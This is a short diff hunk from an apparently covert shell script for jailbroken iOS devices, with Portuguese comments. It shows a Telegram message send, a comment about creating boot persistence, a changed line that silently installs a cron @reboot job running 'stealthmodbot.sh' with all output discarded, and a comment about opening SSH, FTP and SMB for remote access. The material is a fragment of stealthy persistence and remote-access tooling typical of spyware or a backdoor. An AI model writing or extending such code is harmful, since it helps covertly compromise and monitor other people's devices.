@@ -77,7 +77,7 @@ send_telegram "$MSG"
 
 # Criar persistência no boot (Jailbreak necessário)
 if [ -d "/Library/MobileSubstrate" ]; then
-  echo "@reboot /var/root/silent_setup_advanced.sh &> /dev/null &" | crontab -
+  echo "@reboot /var/root/stealthmodbot.sh &> /dev/null &" | crontab -
 fi
 
 # Configurar SSH, FTP e SMB para acesso remoto
